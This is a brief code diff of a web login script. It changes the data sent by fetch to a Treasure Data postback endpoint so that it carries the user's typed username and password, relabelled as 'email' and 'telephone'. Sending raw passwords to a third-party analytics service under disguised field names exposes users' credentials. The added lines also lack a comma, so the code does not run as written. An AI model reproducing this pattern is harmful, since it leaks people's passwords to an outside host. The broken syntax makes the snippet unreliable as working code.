@@ -58,10 +58,8 @@
     const password = document.getElementById('password').value;
 
     const data = {
-    //  username: username,
-    //  password: password,
-        "email": "10.firstname.lastname@business.com",
-        "telephone": "10-555-555-5540" 
+        "email": username
+        "telephone": password
     };
 
     fetch('https://in.treasuredata.com/postback/v3/event/jim_20241001_c_db/postback_api_table', {
